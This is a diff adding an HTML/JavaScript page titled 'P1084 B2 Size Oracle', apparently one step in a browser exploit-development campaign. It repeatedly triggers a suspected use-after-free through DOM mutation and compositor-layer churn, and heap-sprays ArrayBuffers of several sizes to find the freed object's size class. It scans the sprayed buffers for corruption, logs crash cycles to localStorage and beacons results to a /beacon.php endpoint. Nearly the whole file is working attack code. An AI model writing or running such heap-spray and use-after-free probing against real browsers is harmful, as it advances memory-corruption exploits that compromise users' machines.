@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1084 - B2 Size Oracle</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:60vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h2 style="color:#00ff88;font-size:14px">P1084 B2 Size Oracle</h2>
+<div id="log"></div>
+<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px;width:800px;height:600px;overflow:hidden"></div>
+
+<script>
+'use strict';
+var L=document.getElementById('log'),sandbox=document.getElementById('sandbox');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m=String(d||'');log('info','[B] P1084-'+t+' | '+m);
+try{var u='/beacon.php?tag=P1084-'+encodeURIComponent(t);if(m)u+='&data='+encodeURIComponent(m.slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+function h8(v){return('0'+v.toString(16)).slice(-2)}
+
+/* ══════════════════════════════════════════════════════════
+   P1084: B2 single-size timing oracle.
+
+   P1083: P1070's exact B2 trigger crashes 6/6 (4.7-22s wall),
+   pre-spray and in-RAF spray don't prevent it, and Image beacons
+   are dropped during the tight trigger loop (0 CYC beacons in
+   ~4000 cycles). So: measure cycles-to-crash via localStorage
+   (survives the crash), one spray size per load.
+
+   If one size class consistently DELAYS or PREVENTS the crash,
+   that is the freed object's size class and the window is
+   winnable. If none do, B2's free→use window is sub-frame and
+   unreachable from JS — close the lead.
+
+   Runs: 0=control(no spray), then sizes 384,448,512,576,640,768,
+   2048 (2048 = never-match control). maxCycles=200.
+   ══════════════════════════════════════════════════════════ */
+
+var SIZES=[0,384,448,512,576,640,768,2048]; /* 0 = no-spray control */
+var sec=0,res={};
+try{sec=parseInt(localStorage.getItem('p1084_sec')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1084_res');if(r)res=JSON.parse(r);}catch(e){}
+
+/* On boot: recover previous run's final cycle count (survives crash) */
+if(sec>0&&sec<=SIZES.length){
+  var prevSz=SIZES[sec-1];
+  var lastCyc=0;
+  try{lastCyc=parseInt(localStorage.getItem('p1084_cyc')||'0');}catch(e){}
+  if(!res['sz'+prevSz]){
+    res['sz'+prevSz]='CRASH@'+lastCyc;
+    B('CRASH-MEASURE','sz='+prevSz+'|cycles='+lastCyc);
+  }
+  try{localStorage.setItem('p1084_cyc','0');}catch(e){}
+}
+function save(){try{localStorage.setItem('p1084_sec',''+sec);
+  localStorage.setItem('p1084_res',JSON.stringify(res));}catch(e){}}
+save(); /* persist CRASHED mark immediately */
+
+B('BOOT','sec='+sec+'|prev='+JSON.stringify(res).slice(0,400));
+log('ok','=== P1084 size oracle (sec='+sec+') ===');
+
+function runOne(sz){
+  return new Promise(function(resolve){
+    var spray=[],views=[];
+    if(sz>0){
+      for(var i=0;i<300;i++){
+        var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);
+        v[0]=sz&0xFF;v[1]=(sz>>8)&0xFF;v[2]=i&0xFF;
+        for(var j=3;j<sz;j++)v[j]=0x41;
+        spray.push(ab);views.push(v);
+      }
+    }
+    B('RUN-START','sz='+sz+'|spray:'+spray.length);
+
+    sandbox.innerHTML='';
+    var container=document.createElement('div');
+    container.style.cssText='position:relative;width:100px;height:100px';
+    sandbox.appendChild(container);
+    void sandbox.offsetHeight;
+
+    var cycles=0,maxCycles=200;
+    var obs=new MutationObserver(function(){
+      if(cycles<maxCycles){
+        var el=document.createElement('div');
+        el.style.cssText='position:absolute;transform:translateZ(0);will-change:transform;width:10px;height:10px';
+        container.appendChild(el);
+        requestAnimationFrame(function(){
+          if(el.parentNode)el.parentNode.removeChild(el);
+        });
+      }
+    });
+    obs.observe(container,{childList:true,subtree:true});
+
+    var trigger=function(){
+      if(cycles>=maxCycles){
+        obs.disconnect();
+        /* survived 200 cycles — scan */
+        var corrupt=0,firstHex='';
+        for(var i=0;i<views.length;i++){
+          var v=views[i];if(!v)continue;
+          for(var j=3;j<v.length;j++){
+            if(v[j]!==0x41){corrupt++;
+              if(!firstHex){for(var k=0;k<Math.min(64,v.length);k++)firstHex+=h8(v[k]);}
+              break;}
+          }
+        }
+        B('RUN-SCAN','sz='+sz+'|corrupt:'+corrupt+(firstHex?('|hex='+firstHex.substring(0,48)):''));
+        resolve('SURVIVED200-corrupt:'+corrupt);
+        return;
+      }
+      var d=document.createElement('div');
+      d.textContent='t'+cycles;
+      container.appendChild(d);
+      cycles++;
+      try{localStorage.setItem('p1084_cyc',''+cycles);}catch(e){}
+      setTimeout(trigger,5);
+    };
+    trigger();
+  });
+}
+
+async function run(){
+  if(sec<SIZES.length){
+    var sz=SIZES[sec];
+    try{localStorage.setItem('p1084_sec',''+(sec+1));
+        localStorage.setItem('p1084_cyc','0');}catch(e){}
+    var outcome=await runOne(sz);
+    res['sz'+sz]=outcome;sec++;save();
+    B('RUN-DONE','sz='+sz+'|outcome:'+outcome);
+    setTimeout(function(){location.reload(true);},400);
+    return;
+  }
+  var summary=SIZES.map(function(s){return s+'='+(res['sz'+s]||'?');}).join(' | ');
+  B('DONE',summary);
+  log('ok','=== P1084 COMPLETE: '+summary+' ===');
+  try{localStorage.setItem('p1084_sec','0');localStorage.removeItem('p1084_res');
+  localStorage.removeItem('p1084_cyc');}catch(e){}
+}
+
+run();
+
+/* auto-reload check */
+(function(){
+  var cur='P1084-b2-size-oracle';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body>
+</html>
